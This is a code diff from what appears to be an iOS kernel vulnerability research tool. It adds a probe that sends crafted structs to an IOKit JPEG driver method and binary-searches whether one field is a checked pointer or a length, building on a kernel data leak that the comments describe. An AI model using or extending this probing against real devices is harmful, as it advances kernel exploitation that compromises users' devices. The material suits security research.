@@ -763,6 +763,24 @@ static void rs_jm_fill(RSJpegIn *in, uint32_t srcID, uint32_t dstID,
 // Dump bytes as 64-bit words first (a kernel pointer or a leaked address shows
 // up there immediately), then as hex.  This is the first kernel->userland data
 // we have ever been able to read, so the content matters more than the kr.
+// Set one 8-byte slot in a valid sel5 request and return the kr.  Used by the
+// threshold probe to pin the accepted range of a field exactly.
+static kern_return_t rs_jm_tryVal(io_connect_t conn, uint32_t slot, uint64_t val,
+                                  uint32_t srcID, uint32_t dstID, uint32_t w, uint32_t h) {
+    uint8_t *big = (uint8_t *)malloc(0x1000);
+    uint8_t *bigo = (uint8_t *)malloc(0x1000);
+    if (!big || !bigo) { free(big); free(bigo); return (kern_return_t)0x10000002; }
+    memset(big, 0, 0x1000);
+    memset(bigo, 0, 0x1000);
+    rs_jm_fill((RSJpegIn *)big, srcID, dstID, w, h, 0, 0x6161);
+    memcpy(big + slot, &val, 8);
+    size_t os = 0x1000;
+    kern_return_t kr = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &os);
+    free(big);
+    free(bigo);
+    return kr;
+}
+
 static void rs_jm_dump(NSString *what, const uint8_t *p, size_t len) {
     if (!p || len < 8) return;
     size_t n = len > 512 ? 512 : len;
@@ -1073,6 +1091,40 @@ NSString *ModJpegMethods(void) {
             free(bigo);
         }
         free(ubuf);
+    }
+
+    // ---- sel5 THRESHOLD PROBE: +0x78 accepts our user address and 0xdeadbeef
+    //      but rejects 0x414141414141 and 0xffffffffffffffff, so the field IS
+    //      range-checked.  Binary-search the exact boundary: a boundary at a
+    //      user-address-space limit means +0x78 is a POINTER (validated like an
+    //      IOKit user pointer); a boundary at a round byte size means it is a
+    //      LENGTH.  Either answer decides the next move. ----
+    {
+        const uint32_t BASE = (uint32_t)sizeof(RSJpegIn);
+        uint64_t lo = 0, hi = 0;
+        AveLog(@"[jpegmethods] threshold probe on +0x78 (pointer range or size limit?)");
+        for (int shift = 32; shift <= 47; shift++) {
+            uint64_t v = 1ull << shift;
+            kern_return_t kr = rs_jm_tryVal(conn, BASE + 0x20, v, srcID, dstID, W, H);
+            AveLog(S(@"[jpegmethods]   +0x78 = 2^%d = %#018llx -> kr=%#x", shift, v, kr));
+            if (kr == KERN_SUCCESS) lo = v;
+            else { hi = v; break; }
+        }
+        if (lo && hi) {
+            for (int i = 0; i < 8 && hi - lo > 1; i++) {
+                uint64_t mid = lo + (hi - lo) / 2;
+                kern_return_t kr = rs_jm_tryVal(conn, BASE + 0x20, mid, srcID, dstID, W, H);
+                AveLog(S(@"[jpegmethods]   +0x78 = %#018llx -> kr=%#x %@", mid, kr,
+                         kr == KERN_SUCCESS ? @"(accepted)" : @"(rejected)"));
+                if (kr == KERN_SUCCESS) lo = mid; else hi = mid;
+            }
+            AveLog(S(@"[jpegmethods] +0x78 BOUNDARY: accepted <= %#llx, rejected from %#llx", lo, hi));
+            AveLog(S(@"[jpegmethods] +0x78 boundary is 2^%d (accepted) / 2^%d (rejected)",
+                     __builtin_clzll(lo) ? (63 - __builtin_clzll(lo)) : 0,
+                     __builtin_clzll(hi) ? (63 - __builtin_clzll(hi)) : 0));
+        } else {
+            AveLog(S(@"[jpegmethods] threshold probe: no boundary found (lo=%#llx hi=%#llx)", lo, hi));
+        }
     }
 
     IOServiceClose(conn);
